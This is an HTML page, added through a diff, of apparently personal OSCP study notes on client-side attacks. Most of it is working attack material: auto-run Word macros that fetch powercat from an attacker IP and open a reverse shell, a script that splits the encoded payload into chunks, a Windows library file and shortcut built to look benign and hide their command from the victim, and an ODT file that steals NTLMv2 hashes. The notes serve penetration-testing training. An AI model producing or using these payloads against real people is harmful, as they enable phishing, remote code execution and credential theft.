@@ -1,0 +1,1101 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://thatguy9358.github.io/OSCP-Notes/Client_Side_Attacks.html">
+      
+      
+        <link rel="prev" href="Attacks.html">
+      
+      
+        <link rel="next" href="Gotcha%27s.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Client Side Attacks - My site</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#client-side-attacks" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="index.html" title="My site" class="md-header__button md-logo" aria-label="My site" data-md-component="logo">
+      
+  <img src="assets/logo2.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Client Side Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="index.html" title="My site" class="md-nav__button md-logo" aria-label="My site" data-md-component="logo">
+      
+  <img src="assets/logo2.png" alt="logo">
+
+    </a>
+    My site
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Active_Directory.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="Client_Side_Attacks.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client Side Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Gotcha%27s.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Gotcha's
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Information_Gathering.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Gathering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Linux_Priv_Esc.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Linux_commands.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Locating_and_fixing_public_exploits.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Locating and Fixing Public Exploits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Metasploit_Framework.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mind%20Map.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mind Map
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Note_taking_and_Report_writing.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Note Taking and Report Writing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Password_attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Password Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Playbook.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Port_Redirecting_and_Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Port Redirecting and Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Recon.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Resources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerability_Scanning.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Web_Application_Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Application Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Windows_Commands.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Windows_Priv_Esc.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="python_notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Python Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<div><h1 id="client-side-attacks">Client Side Attacks</h1>
+<h1 id="target-recon">Target Recon</h1>
+<p>We can check meta data tags of publicly available documents for the organization --&gt; can include info on author, date, and software
+We can leverage google dorking techniques tosearch for specific file types
+site:example.com filetype:pdf
+We can also use gobuster with the -x parameter to search for specific extensions
+once we get a document downloaded we can use "exfiltool" to gain more info
+    -a displays duplicated tag
+    -u displays unknown tags
+In the example we see a microsoft system was used and we get the authors name</p>
+<h1 id="exploiting-microsoft-office">Exploiting Microsoft office</h1>
+<h2 id="macros">Macros</h2>
+<p>When creating malicious documents with macros we need to save as .doc not .docx. .doc will allow us to embed the macro instead of being forced to use a template. .docm is fine as well
+view--&gt;macro--&gt;create
+Basic macro syntax has a main sub procedure:</p>
+<pre><code class="language-vb">Sub MyMacro()
+'
+' MyMacro Macro
+'
+'
+
+End Sub
+</code></pre>
+<p>In this example we will elverage ActiveX Objects which provide access to underlying operating system commands. this can be achieved by Wscript through the Windows Script Host Shell:</p>
+<pre><code class="language-vb">Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+
+End Sub
+</code></pre>
+<p>Since office MAcros are not run automatically we must use the predefined Autorun() macro and document open event. --&gt; these are like a ven digram. they cover similar cases but have unique edge cases to cover each other so we use both</p>
+<pre><code class="language-vb">Sub AutoOpen()
+
+  MyMacro
+
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+
+End Sub
+
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+
+End Sub
+</code></pre>
+<p>==Download Powercat and maybe PowerShell Empire to Kali box==
+Let's take this a step further and use a command to downlaod Powercat and start a reverse shell
+Note VBA has a 255 character limit for literal strings. I fwe go past this we need to split the command into lines and store in variables
+Let's update the macro with a string variable and run it</p>
+<pre><code class="language-vb">Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+</code></pre>
+<p>Next we employ a powershell command to download powercat and execute the reverse shell
+This is the powershell command before base64 encoding</p>
+<pre><code class="language-PowerShell">IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+</code></pre>
+<p>We can base 64 encode the command and then use this simple python script to break up the command into chunks and output what we should paste in the macro</p>
+<pre><code class="language-python">str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+
+n = 50
+
+for i in range(0, len(str), n):
+    print("Str = Str + " + '"' + str[i:i+n] + '"')
+</code></pre>
+<p>our encoded command should be after -e flag
+now our macro will look like this</p>
+<pre><code class="language-vb">Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+</code></pre>
+<p>make sure we host the executable on a webserver and run a listener</p>
+<h2 id="abusing-windows-libraries">Abusing Windows Libraries</h2>
+<p>.Library-ms files can be executed by clicking on them
+We can exploit this in two steps. Use a malicious file to get a foothold and another one to get a reverse shell
+For the first stage we will set up a WebDAV library file that looks like a regular file explorer, but has a .lnk to execute a payload
+First we need to setup our webDAV share on the kali system
+make sure we have webDAV installed:
+<code>pip3 install wsgidav</code>
+set up WebDav directory:</p>
+<pre><code class="language-shell">mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+</code></pre>
+<p>we can use either notepad or visual basic studio to create the library file
+Library files consist of three major parts and are written in xml to specify the parameters for accessing remote locations
+ - General library info
+ - Library properties
+ - library locations
+We start by adding the library's file format and version:</p>
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>Next we add two tags providing info about the library
+- name: we cannot give an an arbitrary name. We can use @shell32.dll,-34575_ or @windows.storage.dll,-34582_ as specified on the Microsoft website. We'll use the latter to avoid any issues with text-based filters that may flag on "shell32".
+- version: this can be a random number</p>
+<pre><code>&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+</code></pre>
+<p>Next we'll add the isLibraryPinned tag set to true. this pins our directory to the navigation pane in file explrorer --&gt; this makes it seem more genuine to targets.
+Next add the icon reference tag to determine the icon displayed. We use imagesres.dll and can choose between all the windows Icons; -1002 is documents folder icon -1003 is picture folder icon. We provide the latter to make it look more benign</p>
+<pre><code>&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+</code></pre>
+<p>Now we need the templateInfo type. we need to input a GUID so file explorer knows what details to display. We will use the documents GUID</p>
+<pre><code>&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+</code></pre>
+<p>The next tag marks the beginning of the library locations
+We need to use the SearchConnectorDescriptionList defined by
+searchConnectorDescription tags
+we only need 1 searchConnectionDescription with the following 3 tags:</p>
+<pre><code>&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://ATTACKING MACHINE IP&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+</code></pre>
+<p>The full code for our WebDAV share is as follows</p>
+<pre><code class="language-vb">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://ATTACK MACHINE IP&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>Let's save and close the file in Visual Studio Code. We'll then double-click the <strong>config.Library-ms</strong> file on the Desktop.
+When we open the directory in Explorer, we find the previously-created <strong>test.txt</strong> file we placed in the WebDAV share. Therefore, the library file works and embeds the connection to the WebDAV share.
+When we re-open our file in Visual Studio Code, we find that a new tag appeared named <em>serialized</em>.<a href="https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files#fn23">23</a> The tag contains base64-encoded information about the location of the <em>url</em> tag. Additionally, the content inside the <em>url</em> tags has changed from <strong>http://192.168.119.2</strong> to <strong>\192.168.119.2\DavWWWRoot</strong>. Windows tries to optimize the WebDAV connection information for the Windows WebDAV client<a href="https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/client-side-attacks/abusing-windows-library-files/obtaining-code-execution-via-windows-library-files#fn24">24</a> and therefore modifies it.
+==The library file still works when we double-click it, but due to the encoded information in the <em>serialized</em> tag, it may not be working on other machines or after a restart.==
+To avoid running into any issues when performing this attack, we can reset the file to its original state by pasting the contents of listing 17 (the full code block) into Visual Studio Code. Unfortunately, we need to do this every time we execute the Windows library file.</p>
+<p>Now we need to craft a .lnk file to execute a reverse shell
+in a windows machine we can right click Desktop--&gt;New--&gt;shortcut and we can enter a path to the program and arguments
+We can use the previous pwershell command to download Powercat and execute a reverse shell</p>
+<pre><code>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c 192.168.119.3 -p 4444 -e powershell"
+</code></pre>
+<p>The above command gets pasted in the bar for "location of this item"
+If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.
+In the next window we enter automatic_configuration as the name for the shortcut file and click Finish to create
+To confirm the shortcut works double click it ont he desktop</p>
+<p>Now it is time to attack a victim
+we copy automatic_configguration.lnk and config.Library-ms to our WebDAV directory
+start webserver, listener and WsgiDAV fir the WebDAV share</p>
+<h1 id="odt-files">ODT files</h1>
+<h3 id="ntlmv2-theft-through-odt-file">NTLMv2 Theft through ODT File</h3>
+<p>From the information retrieved after uploading a file, we know that our uploaded ODT files is reviewed by a staff.  This can be exploited by uploading an ODT file <a href="https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/">embedded with malicious code</a> to steal the NTLMv2 hash of the user reviewing the file.</p>
+<p>To create our ODT file, we will need to:</p>
+<ol>
+<li>
+<p>Open LibreOffice Writer</p>
+</li>
+<li>
+<p>Insert → Object → OLE Object → Create From File</p>
+</li>
+<li>
+<p>Check “create from file” and “Link to file”</p>
+</li>
+<li>
+<p>In file parameter, select any file and then click "OK".</p>
+</li>
+<li>
+<p>Save the file as "test1.odt" and exit libreoffice.</p>
+</li>
+</ol>
+<p>We now have an ODT file that we can work with. Let's unzip the file to view the source files.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ unzip test1.odt
+Archive:  test1.odt
+ extracting: mimetype
+ inflating: ObjectReplacements/Object 1
+ inflating: settings.xml
+ extracting: Thumbnails/thumbnail.png
+ creating: Configurations2/toolbar/
+ creating: Configurations2/floater/
+ creating: Configurations2/popupmenu/
+ creating: Configurations2/menubar/
+ creating: Configurations2/accelerator/
+ creating: Configurations2/toolpanel/
+ creating: Configurations2/progressbar/
+ creating: Configurations2/statusbar/
+ creating: Configurations2/images/Bitmaps/
+ inflating: manifest.rdf
+ inflating: meta.xml
+ inflating: styles.xml
+ inflating: content.xml
+ inflating: META-INF/manifest.xml
+</code></pre>
+<p>We can edit <strong>content.xml</strong> and replace the <code>href</code> value of the file you selected previously to <code>file://IP/test.jpg</code> in the tag that starts with <code>&lt;draw:object</code> .</p>
+<pre><code>&lt;draw:object xlink:href="file://192.168.213.128/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/&gt;
+</code></pre>
+<p>With our changes in place, we re-zip the document back to an ODT file.</p>
+<pre><code>zip -r Document.odt *
+</code></pre>
+<p>catch hash with responder</p></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
